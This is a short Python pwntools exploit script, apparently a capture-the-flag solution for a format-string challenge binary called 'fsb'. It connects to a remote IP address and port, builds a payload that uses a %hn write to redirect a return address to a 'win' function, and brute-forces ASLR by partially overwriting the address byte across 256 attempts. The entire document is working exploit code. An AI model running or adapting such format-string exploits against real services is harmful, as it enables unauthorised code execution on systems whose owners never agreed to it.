from pwn import *

#context.log_level = 'debug'


for i in range(256):
    #p = process(['./ld-linux-x86-64.so.2', './fsb'], env={"LD_PRELOAD":"./libc.so.6"})
    p = remote('147.46.113.56', 25393)

    # win: 0x4011B7
    # +1 to avoid stack alignment check
    win = 0x4011B8

    payload = b''
    payload += f'%{(win & 0xffff)}c'.encode()
    payload += f'%{6 + 4}$hn'.encode()
    payload += b'A' * 0x14
    payload += b'\x08' # Bruteforce ASLR (ret addr at: 0x##########?8)

    #pause()
    p.send(payload)

    p.interactive()